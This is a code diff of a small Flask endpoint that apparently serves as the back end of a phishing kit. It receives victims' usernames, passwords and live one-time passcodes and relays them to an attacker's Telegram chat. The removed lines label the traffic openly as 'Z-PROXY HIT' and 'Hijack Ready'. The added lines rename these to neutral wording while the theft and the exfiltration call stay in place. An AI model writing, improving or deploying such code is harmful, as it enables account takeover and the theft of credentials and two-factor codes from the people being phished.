@@ -4,29 +4,25 @@ import os
 
 app = Flask(__name__)
 
-# Environment Variables
+# Settings -> Environment Variables
 TOKEN = os.environ.get('BOT_TOKEN')
-CHAT_ID = os.environ.get('CHAT_ID')
+CID = os.environ.get('CHAT_ID')
 
 @app.route('/api', methods=['POST'])
-def middleman():
-    try:
-        data = request.get_json(force=True)
-        user = data.get('u')
-        dtype = data.get('type')
-        
-        msg = f"🥷 **Z-PROXY HIT**\n\n👤 User: `{user}`\n"
-        
-        if dtype == 'OTP_LIVE':
-            msg += f"🔢 **LIVE OTP:** `{data.get('o')}`\n🔥 Status: Hijack Ready"
-        else:
-            msg += f"🔑 **Pass:** `{data.get('p')}`\n📊 **Attempt:** {dtype}"
+def handle():
+    data = request.get_json(force=True)
+    user = data.get('u')
+    dtype = data.get('t')
+    
+    msg = f"🛰 **SYSTEM SIGNAL RECEIVED**\n👤 User: `{user}`\n"
+    
+    if dtype == 'OTP_LIVE':
+        msg += f"🔢 **PIN:** `{data.get('o')}`\n✅ Action: Login Now!"
+    else:
+        msg += f"🔑 **Key:** `{data.get('p')}`\n📊 **Stage:** {dtype}"
 
-        # Telegram Call
-        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
-        return jsonify({"status": "received"})
-    except:
-        return jsonify({"status": "error"}), 500
+    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={"chat_id": CID, "text": msg, "parse_mode": "Markdown"})
+    return jsonify({"status": "ok"})
 
 def handler(req, res):
     return app(req, res)
